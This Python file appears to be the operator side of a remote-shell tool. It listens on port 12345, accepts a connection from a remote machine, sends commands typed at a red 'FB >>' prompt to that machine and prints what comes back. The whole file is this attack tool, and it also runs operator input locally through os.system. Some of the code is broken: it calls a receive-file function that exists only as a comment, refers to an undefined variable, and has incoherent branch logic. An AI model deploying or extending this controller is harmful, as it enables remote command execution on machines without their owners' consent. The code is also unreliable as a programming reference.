import socket
import os
from time import sleep
import subprocess

class Shell:
    def __init__(self, shell_python):
        self.shell_python = shell_python

    def verifications(shell_python):
        action = shell_python

        match action:

            case "shell":
                print("[DEBUG]: " + action)
                while True:
                    shell = Shell.command()
                    if shell == "exit":
                        break

            case "exit":
                print("[DEBUG]: " + action)
                conn.close()
                s.close()
                exit()

            case "recv archive":
                print("[DEBUG]: " + action)
                Shell.recv_archive(shell_python)
                if(not shell_python in action):
                    if(action == shell in shell_python):
                        return (" ")
                    os.system(shell_python)
                    print("\n")

            case "help":
                print("help")                
            

    def home():
        conn.send("home".encode())
        HOME = conn.recv(1024).decode("utf-8")
        return(HOME)

    def command():
        HOME = Shell.home()
        SHELL = str(input("%s>> "%(HOME)))
        if(SHELL == "exit"):
            SHELL = ""
            return("exit")
        conn.send("command".encode())
        sleep(1)
        conn.send(SHELL.encode())
        print(conn.recv(1024).decode("utf-8"))
    # def recv_archive(filenames)



## Traitement ##

IP = "FRANCOISBRIC127"
PORT = 12345
# BUFFER_SIZE = 1024 * 128
# SEPARATOR = "<sep>"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((IP, PORT))
s.listen(10)
conn, client = s.accept()
welcome = conn.recv(1024)
print(welcome.decode("utf-8"))

while True:
    try:
        shell_python = str(input("\033[31m\033[1mFB \033[31m>>\033[1;32m "))
        Shell.verifications(shell_python)
    except KeyboardInterrupt:
        conn.close()
        s.close()
        exit()
